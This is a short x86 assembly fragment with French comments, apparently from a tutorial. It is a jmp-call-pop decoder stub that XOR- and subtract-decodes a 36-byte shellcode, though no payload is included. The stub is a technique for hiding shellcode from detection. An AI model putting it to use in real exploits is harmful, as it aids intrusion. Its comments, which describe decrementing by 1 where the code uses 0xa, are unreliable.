jmp short three
	
	one:
	 pop esi	
	 xor ecx, ecx
	 mov cl, 36			; On place dans %cl la taille de notre shellcode

	two:
	 xor byte [esi + ecx - 1 ], 0xa	; on décrémente de 1 notre chaîne
     sub byte [esi + ecx - 1 ], 0xa	; on décrémente de 1 notre chaîne
	 sub cl,1			; on décrémente de 1 la taille de la chaîne
	 jnz two			; on test si %cl est à 0 (si c'est la fin de notre chaîne)
	 jmp short four			; si c'est le cas on sort de la boucle

	three:
	 call one

	four: